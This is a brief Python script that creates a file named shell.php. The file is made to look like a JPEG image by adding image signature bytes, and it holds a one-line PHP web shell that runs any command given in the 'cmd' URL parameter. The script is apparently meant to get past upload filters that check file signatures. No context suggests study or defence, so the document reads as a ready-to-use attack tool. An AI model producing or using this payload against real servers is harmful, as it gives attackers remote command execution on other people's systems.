#! /usr/bin/python

fd = open("shell.php", "wb")
fd.write(b'\xFF\xD8\xFF\xD9')
fd.write(b'<?php passthru($_GET["cmd"]); ?>')
fd.close()
